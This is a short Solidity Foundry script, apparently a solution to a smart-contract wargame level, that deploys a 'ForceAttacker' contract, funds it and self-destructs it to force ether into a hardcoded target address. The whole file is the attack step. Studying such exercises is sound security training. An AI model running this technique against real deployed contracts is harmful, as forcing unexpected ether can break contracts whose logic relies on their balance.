// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {ForceAttacker} from "../src/ForceAttacker.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract ForceAttackerExecuter is Script, HelperConfigLib {
    function run() external {
        vm.startBroadcast(ATTACKER_KEY);
        ForceAttacker attacker = new ForceAttacker();
        (bool success, ) = payable(address(attacker)).call{value: 0.01 ether}(
            ""
        );
        attacker.destructMe(
            payable(0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D)
        ); // from contract.address
        vm.stopBroadcast();

        require(success);
    }
}
